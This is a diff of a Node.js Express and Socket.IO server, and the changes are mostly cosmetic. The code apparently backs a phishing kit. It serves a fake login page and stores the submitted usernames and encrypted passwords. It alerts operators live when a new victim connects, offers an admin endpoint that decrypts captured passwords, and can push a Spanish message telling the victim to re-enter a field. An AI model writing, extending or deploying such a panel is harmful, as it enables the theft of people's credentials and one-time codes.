@@ -1,6 +1,6 @@
 const express = require('express');
 const http = require('http');
-const path = require('path');   // ✅ Declarado una sola vez
+const path = require('path');
 const helmet = require('helmet');
 const cors = require('cors');
 const cookieParser = require('cookie-parser');
@@ -11,8 +11,10 @@ const crypto = require('crypto');
 const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
 
+// AES Encryption
 const AES_KEY = process.env.AES_KEY_BASE64 ? Buffer.from(process.env.AES_KEY_BASE64, 'base64') : Buffer.alloc(0);
 const AES_IV = process.env.AES_IV_BASE64 ? Buffer.from(process.env.AES_IV_BASE64, 'base64') : Buffer.alloc(0);
+
 if (AES_KEY.length !== 32 || AES_IV.length !== 16) {
   console.warn('Warning: AES key or IV not set correctly. See .env.example');
 }
@@ -23,6 +25,7 @@ function encrypt(text){
   const encrypted = Buffer.concat([cipher.update(String(text), 'utf8'), cipher.final()]);
   return encrypted.toString('base64');
 }
+
 function decrypt(b64){
   if(!b64) return null;
   const encrypted = Buffer.from(b64, 'base64');
@@ -36,11 +39,10 @@ const app = express();
 // --- Serve frontend static files from Personal/ ---
 app.use(express.static(path.join(__dirname, '..', 'Personal')));
 
-// root -> Login index
+// Root -> Login index
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, '..', 'Personal', 'Login', 'index.html'));
 });
-// ---------------------------------------------------------------
 
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
@@ -57,28 +59,30 @@ app.use(session({
   cookie: { secure: false }
 }));
 
-// --- Ajuste de rutas de archivos estáticos --- //
-app.use('/admin/static', express.static(path.join(__dirname, 'admin')));
-app.use('/sounds', express.static(path.join(__dirname, 'sounds')));
+// --- Serve admin static files ---
+app.use('/admin/static', express.static(path.join(__dirname, 'public', 'admin')));
+app.use('/sounds', express.static(path.join(__dirname, 'public', 'sounds')));
 
-// --- Simple admin auth (session-based) ---
+// --- Admin login/logout ---
 app.post('/admin/login', (req, res) => {
   const { user, pass } = req.body;
-  if (user === process.env.ADMIN_USER && pass === process.env.ADMIN_PASS) {
+  if(user === process.env.ADMIN_USER && pass === process.env.ADMIN_PASS){
     req.session.admin = true;
     return res.json({ ok: true });
   }
   res.status(401).json({ ok: false });
 });
+
 app.post('/admin/logout', (req, res) => {
   req.session.destroy(() => res.json({ ok: true }));
 });
+
 function requireAdmin(req, res, next){
-  if (req.session && req.session.admin) return next();
+  if(req.session && req.session.admin) return next();
   return res.status(401).json({ ok: false, msg: 'unauthorized' });
 }
 
-// --- API to save incoming user form data (via fetch) ---
+// --- API to save user form data ---
 app.post('/api/save', (req, res) => {
   const body = req.body || {};
   const clientId = body.clientId || uuidv4();
@@ -95,6 +99,7 @@ app.post('/api/save', (req, res) => {
   };
   db.upsertUser(record);
   io.to('admins').emit('user_updated', db.getUserByClientId(clientId));
+
   const user = db.getUserByClientId(clientId);
   if(user && !user.notified){
     io.to('admins').emit('new_user_connected', { clientId: user.clientId, usuario: user.usuario });
@@ -112,7 +117,7 @@ app.get('/admin/records', requireAdmin, (req, res) => {
 
 app.post('/admin/action', requireAdmin, (req, res) => {
   const { clientId, field, action } = req.body;
-  if (!clientId || !action) return res.status(400).json({ ok: false });
+  if(!clientId || !action) return res.status(400).json({ ok: false });
   const note = action === 'retry' ? `retry:${field}` : `continue`;
   db.setClientCommand(clientId, note);
   io.to('client:' + clientId).emit('admin_command', { field, action, message: action === 'retry' ? `Debes volver a colocar tu ${field}` : 'Continua' });
@@ -123,22 +128,23 @@ app.post('/admin/action', requireAdmin, (req, res) => {
 app.get('/admin/decrypt/:clientId', requireAdmin, (req, res) => {
   const clientId = req.params.clientId;
   const user = db.getUserByClientId(clientId);
-  if (!user) return res.status(404).json({ ok: false });
+  if(!user) return res.status(404).json({ ok: false });
   const decrypted = user.password_enc ? decrypt(user.password_enc) : null;
   res.json({ ok: true, password: decrypted });
 });
 
-// --- Simple admin UI entry ---
+// --- Admin UI ---
 app.get('/admin', (req, res) => {
-  res.sendFile(path.join(__dirname, 'admin', 'index.html'));
+  res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
 });
 
-// --- Socket.IO connection handling ---
+// --- Socket.IO ---
 io.on('connection', (socket) => {
   socket.on('register_admin', () => {
     socket.join('admins');
     socket.emit('initial_data', db.getAllUsers());
   });
+
   socket.on('register_client', (data) => {
     const clientId = data && data.clientId ? data.clientId : uuidv4();
     socket.join('client:' + clientId);
